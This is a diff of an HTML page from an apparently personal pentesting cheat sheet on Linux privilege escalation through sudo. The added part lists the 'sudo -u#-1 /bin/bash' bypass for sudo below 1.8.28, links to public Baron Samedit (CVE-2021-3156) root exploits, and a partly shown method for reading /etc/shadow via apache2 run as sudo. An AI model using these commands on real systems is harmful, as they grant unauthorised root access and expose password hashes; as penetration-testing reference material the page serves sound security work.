@@ -8,28 +8,28 @@
     <!-- Primary Meta Tags -->
     <title>Sudo</title>
     <meta name="title" content="Sudo">
-    <meta name="description" content="Use apache2 to read /etc/shadow file:" />
+    <meta name="description" content="Get sudo version" />
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://caueb.github.io/linuxprivesc/sudo25db8/">
     <meta property="og:title" content="Sudo">
-    <meta property="og:description" content="Use apache2 to read /etc/shadow file:">
+    <meta property="og:description" content="Get sudo version">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
     <meta property="twitter:url" content="https://caueb.github.io/linuxprivesc/sudo25db8/">
     <meta property="twitter:title" content="Sudo">
-    <meta property="twitter:description" content="Use apache2 to read /etc/shadow file:">
+    <meta property="twitter:description" content="Get sudo version">
     
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="/resources/css/retype.css?v=1.11.2.700101336597" rel="stylesheet" data-turbo-track="reload" />
+    <link href="/resources/css/retype.css?v=1.11.2.700793353140" rel="stylesheet" data-turbo-track="reload" />
 
-    <script type="text/javascript" src="/resources/js/config.js?v=1.11.2.700101336597" defer data-turbo-track="reload"></script>
+    <script type="text/javascript" src="/resources/js/config.js?v=1.11.2.700793353140" defer data-turbo-track="reload"></script>
     <script type="text/javascript" src="/resources/js/retype.js?v=1.11.2" defer data-turbo-track="reload"></script>
-    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=1.11.2.700101336597" defer></script>
-    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=1.11.2.700101336597" defer></script>
+    <script id="lunr-js" type="text/javascript" src="/resources/js/lunr.js?v=1.11.2.700793353140" defer></script>
+    <script id="prism-js" type="text/javascript" src="/resources/js/prism.js?v=1.11.2.700793353140" defer></script>
 </head>
     <body>
         <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -190,16 +190,58 @@
         <span>Sudo</span>
     </h1>
 </doc-anchor-target>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-bash"><code v-pre class="language-bash">sudo -l</code></pre>
-</doc-codeblock></div>
-<doc-anchor-target id="apache">
+<doc-anchor-target id="vulnerable-versions">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#apache">#</doc-anchor-trigger>
-        <span>Apache</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#vulnerable-versions">#</doc-anchor-trigger>
+        <span>Vulnerable Versions</span>
     </h2>
 </doc-anchor-target>
-<p>Use apache2 to read /etc/shadow file:</p>
+<p>Get sudo version</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sudo -V</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="sudo--1828">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sudo--1828">#</doc-anchor-trigger>
+        <span>Sudo &lt; 1.8.28</span>
+    </h3>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">$ sudo -l 
+
+User hacker may run the following commands on kali:
+    (ALL, !root) /bin/bash
+
+
+$ sudo -u#-1 /bin/bash</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cve-2021-3156-sudo-baron-samedit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cve-2021-3156-sudo-baron-samedit">#</doc-anchor-trigger>
+        <span>CVE-2021-3156 (Sudo Baron Samedit)</span>
+    </h3>
+</doc-anchor-target>
+<p>Affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">https://github.com/worawit/CVE-2021-3156</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cve-2021-3156---sudo-1831-no-bruteforce">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cve-2021-3156---sudo-1831-no-bruteforce">#</doc-anchor-trigger>
+        <span>CVE-2021-3156 - Sudo 1.8.31 (no bruteforce)</span>
+    </h4>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
+</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="apache-as-sudo">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#apache-as-sudo">#</doc-anchor-trigger>
+        <span>Apache as sudo</span>
+    </h2>
+</doc-anchor-target>
+<p>If we can run Apache as sudo, use apache2 to read /etc/shadow file:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-bash"><code v-pre class="language-bash">/usr/bin/apache2
 
